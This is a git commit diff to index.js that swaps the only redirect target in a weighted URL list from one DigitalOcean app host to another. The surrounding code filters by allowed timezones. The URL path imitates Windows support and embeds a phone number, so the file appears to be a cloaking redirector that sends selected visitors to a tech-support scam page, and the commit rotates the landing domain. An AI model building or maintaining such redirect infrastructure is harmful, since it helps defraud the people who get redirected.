3ac06b25196ff70056d2d907108ec99741d8e391
paalakash <palaksh452@gmail.com>
2026-06-20 14:08:25 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://shark-app-o4x2w.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5380", weight: 1.0 }
+    { url: "https://squid-app-36bm3.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5380", weight: 1.0 }
 
 ];
 
